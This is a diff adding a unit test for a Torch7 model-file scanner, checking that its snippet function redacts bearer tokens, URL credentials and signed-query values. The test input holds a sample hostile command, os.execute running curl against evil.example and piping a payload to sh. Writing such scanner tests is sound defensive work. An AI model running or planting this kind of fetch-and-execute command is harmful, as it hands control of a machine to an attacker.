@@ -108,6 +108,22 @@ def test_scan_redacts_sensitive_torch7_execution_examples(tmp_path: Path) -> Non
     )
 
 
+def test_torch7_snippet_redacts_url_userinfo_signed_queries_and_bearer_values() -> None:
+    snippet = Torch7Scanner._snippet(
+        "Authorization: Bearer BEARERSECRET123 "
+        "cmd=os.execute('curl https://alice:URLPASSWORD123@evil.example/payload.sh?"
+        "x-amz-signature=SIGNATURESECRET123 | sh')",
+        max_chars=500,
+    )
+
+    assert "BEARERSECRET123" not in snippet
+    assert "URLPASSWORD123" not in snippet
+    assert "SIGNATURESECRET123" not in snippet
+    assert "Authorization: Bearer <redacted>" in snippet
+    assert "https://<credentials-redacted>@evil.example/payload.sh" in snippet
+    assert "x-amz-signature=<redacted>" in snippet
+
+
 def test_scan_preserves_benign_torch7_execution_examples(tmp_path: Path) -> None:
     payload = (
         b"T7\x00\x00torch.FloatTensor nn.Sequential\n"
